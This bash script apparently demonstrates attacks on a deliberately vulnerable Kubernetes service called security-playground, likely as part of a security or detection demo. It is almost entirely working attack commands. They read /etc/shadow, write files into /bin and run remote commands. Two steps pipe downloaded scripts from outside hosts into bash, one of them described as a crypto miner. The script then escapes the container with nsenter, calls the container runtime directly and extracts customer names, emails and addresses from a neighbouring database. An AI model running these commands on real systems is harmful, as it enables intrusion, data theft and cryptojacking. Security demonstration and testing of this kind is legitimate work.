#!/bin/bash
# Script to demonstrate how to interact with security-playground

# Required parameters are the IP of a Node and then the port
# (Given this is a NodePort Service)

# Error if they don't specify an IP
if [ $1 == "" ]
  then
    echo "Error: No Node IP specified"
fi

# Error if they don't specify port
if [ $2 -eq 0 ]
  then
    echo "Error: No port specified"
fi

echo "1. Exploit reading our /etc/shadow file and sending it back to us"
curl $1:$2/etc/shadow

echo "2. Exploit writing \"hello-world\" to /bin/hello within our container"
curl -X POST $1:$2/bin/hello -d 'content=hello-world'
echo ""
echo "and then read it back remotely"
curl $1:$2/bin/hello
echo ""

echo "3. Exploit installing dnsutils and doing a dig against k8s DNS"
curl -X POST $1:$2/exec -d 'command=apt-get update; apt-get -y install dnsutils;/usr/bin/dig srv any.any.svc.cluster.local'

echo "4. Exploit running a script to run a crypto miner"
curl -X POST $1:$2/exec -d 'command=curl https://raw.githubusercontent.com/sysdiglabs/policy-editor-attack/master/run.sh | bash'

echo "5. Break out of our namespace to the host's with nsenter and install crictl in /usr/bin"
curl -X POST $1:$2/exec -d 'command=curl https://z9k65lokhn70.s3.amazonaws.com/install-crictl.sh | bash'

echo "6. Break out of our namespace to the host's with nsenter and talk directly to the container runtime"
curl -X POST $1:$2/exec -d 'command=nsenter --all --target=1 crictl ps'

echo "7. Exfil some data from another container running on the same Node"
POSTGRES_ID=$(curl -X POST $1:$2/exec -d 'command=nsenter --all --target=1 crictl ps --name postgres-sakila -q')
curl -X POST $1:$2/exec -d "command=nsenter --all --target=1 crictl exec $POSTGRES_ID psql -U postgres -c 'SELECT c.first_name, c.last_name, c.email, a.address, a.postal_code FROM customer c JOIN address a ON (c.address_id = a.address_id)'"